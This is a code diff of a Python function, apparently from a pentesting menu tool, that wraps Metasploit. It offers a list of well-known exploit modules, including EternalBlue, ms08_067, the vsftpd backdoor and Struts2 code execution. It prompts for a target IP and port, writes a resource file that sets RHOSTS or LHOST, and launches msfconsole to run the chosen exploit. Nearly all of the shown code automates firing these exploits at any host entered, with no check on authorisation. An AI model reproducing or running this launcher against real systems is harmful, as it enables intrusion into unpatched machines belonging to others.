@@ -477,72 +477,108 @@ import tempfile
 from colorama import Fore
 
 def metasploit_scan():
-    ip = get_ip_address()  # Prompt for IP address
-    if ip:
-        port = get_port_number()  # Prompt for port number
-        if not port:
-            print(Fore.RED + "No port entered. Returning to the main menu...")
-            return
-        try:
-            while True:
-                print(Fore.BLUE + "\nChoose a Metasploit option:")
-                print("1. Scan for vulnerabilities")
-                print("3. Manual Metasploit")
-                print("4. Run Exploits")
-                print("99. Return to main menu")
-                choice = input(Fore.BLUE + "\nEnter your choice: ").strip()
+    try:
+        while True:
+            print(Fore.BLUE + "\nChoose a Metasploit option:")
+            print("1. Scan for vulnerabilities")
+            print("2. Exploit a vulnerability")
+            print("3. Manual Metasploit")
+            print("4. View Network Exploits")
+            print("99. Return to main menu")
+            choice = input(Fore.BLUE + "\nEnter your choice: ").strip()
 
-                metasploit_commands = ""
-                if choice == '1':
-                    metasploit_commands = f"auxiliary/scanner/http/http_version"
-                elif choice == '3':
-                    metasploit_commands = input(Fore.BLUE + "Enter your Metasploit commands (separated by newlines):\n")
-                elif choice == '4':
-                    print(Fore.BLUE + "\nExploits")
-                    exploits = {
-                        "11": "exploit/multi/http/tomcat_mgr_upload",
-                        "22": "exploit/windows/dcerpc/ms03_026_dcom",
-                        "33": "exploit/windows/smb/ms08_067_netapi",
-                        "44": "exploit/unix/ftp/vsftpd_234_backdoor",
-                        "55": "exploit/multi/http/struts2_code_exec",
-                        "66": "exploit/multi/http/jboss_deployment_scanner",
-                        "77": "exploit/windows/smb/ms17_010_eternalblue ",
-                        "88": "exploit/multi/handler",
-                    }
-                    for key, value in exploits.items():
-                        print(f"{key}: {value}")
-                    exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
-                    if exploit_choice in exploits:
+            metasploit_commands = ""
+            ip = ""
+            port = ""
+
+            if choice == '1':  # Scan for vulnerabilities
+                ip = get_ip_address()  # Assuming get_ip_address() prompts for IP
+                if not ip:
+                    print(Fore.RED + "No IP address provided. Returning to the main menu...")
+                    return
+
+                port = get_port_number()  # Assuming get_port_number() prompts for Port
+                if not port:
+                    print(Fore.RED + "No port entered. Returning to the main menu...")
+                    return
+                metasploit_commands = f"use auxiliary/scanner/http/http_version\nset RHOSTS {ip}\nset RPORT {port}\nrun"
+            elif choice == '2':  # Exploit a vulnerability
+                ip = get_ip_address()  # Prompt for IP address
+                if not ip:
+                    print(Fore.RED + "No IP address provided. Returning to the main menu...")
+                    return
+
+                port = get_port_number()  # Prompt for Port number
+                if not port:
+                    print(Fore.RED + "No port entered. Returning to the main menu...")
+                    return
+                metasploit_commands = input(Fore.BLUE + "Enter your Metasploit commands (separated by newlines):\n")
+            elif choice == '4':  # View Network Exploits
+                print(Fore.BLUE + "\nrun exploits")
+                exploits = {
+                    "11": "exploit/multi/http/tomcat_mgr_upload",
+                    "22": "exploit/windows/dcerpc/ms03_026_dcom",
+                    "33": "exploit/windows/smb/ms08_067_netapi",
+                    "44": "exploit/unix/ftp/vsftpd_234_backdoor",
+                    "55": "exploit/multi/http/struts2_code_exec",
+                    "66": "exploit/multi/http/jboss_deployment_scanner",
+                    "77": "exploit/windows/smb/ms17_010_eternalblue"
+                }
+                for key, value in exploits.items():
+                    print(f"{key}: {value}")
+                exploit_choice = input(Fore.BLUE + "\nEnter the number of the exploit you want to run: ").strip()
+
+                if exploit_choice in exploits:
+                    # Prompt for IP and Port only when choosing an exploit
+                    ip = get_ip_address()  # Prompt for IP address
+                    if not ip:
+                        print(Fore.RED + "No IP address provided. Returning to the main menu...")
+                        return
+
+                    port = get_port_number()  # Prompt for Port number
+                    if not port:
+                        print(Fore.RED + "No port entered. Returning to the main menu...")
+                        return
+
+                    # Ask user whether to use LHOST or RHOST for the exploit
+                    host_type = input(Fore.BLUE + "Do you want to use LHOST or RHOST? ").strip().lower()
+
+                    if host_type == 'rhost':
                         metasploit_commands = f"use {exploits[exploit_choice]}\nset RHOSTS {ip}\nset RPORT {port}\nrun"
+                    elif host_type == 'lhost':
+                        metasploit_commands = f"use {exploits[exploit_choice]}\nset LHOST {ip}\nset LPORT {port}\nrun"
                     else:
-                        print(Fore.RED + "Invalid exploit choice.")
-                        continue
-                elif choice == '99':
-                    print(Fore.LIGHTCYAN_EX + "Returning to the main menu...")
-                    break
+                        print(Fore.RED + "Invalid choice. Please select either 'LHOST' or 'RHOST'.")
+                        continue  # Ask again if invalid input
                 else:
-                    print(Fore.RED + "Invalid choice. Please try again.")
+                    print(Fore.RED + "Invalid exploit choice.")
                     continue
+            elif choice == '99':  # Return to main menu
+                print(Fore.LIGHTCYAN_EX + "Returning to the main menu...")
+                break
+            else:
+                print(Fore.RED + "Invalid choice. Please try again.")
+                continue
 
-                # Run the command in Metasploit
-                if metasploit_commands:
-                    print(Fore.BLUE + "Launching Metasploit...")
+            # Run the command in Metasploit
+            if metasploit_commands:
+                print(Fore.BLUE + "Launching Metasploit...")
 
-                    # Create a temporary resource file to hold the Metasploit commands
-                    with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.rc') as rc_file:
-                        rc_file.write(metasploit_commands)
-                        rc_file_path = rc_file.name
+                # Create a temporary resource file to hold the Metasploit commands
+                with tempfile.NamedTemporaryFile(delete=False, mode='w', suffix='.rc') as rc_file:
+                    rc_file.write(metasploit_commands)
+                    rc_file_path = rc_file.name
 
-                    # Use the -r option to pass the resource file to msfconsole for faster execution
-                    full_command = f"msfconsole -q -r {rc_file_path}"
-                    os.system(full_command)
+                # Use the -r option to pass the resource file to msfconsole for faster execution
+                full_command = f"msfconsole -q -r {rc_file_path}"
+                os.system(full_command)
 
-                    # Delete the temporary resource file after execution
-                    os.remove(rc_file_path)
-                    break  # Exit the loop after launching Metasploit
+                # Delete the temporary resource file after execution
+                os.remove(rc_file_path)
+                break  # Exit the loop after launching Metasploit
 
-        except Exception as e:
-            print(Fore.RED + f"Error running Metasploit: {e}")
+    except Exception as e:
+        print(Fore.RED + f"Error running Metasploit: {e}")
 
 
 # Function to run Routersploit
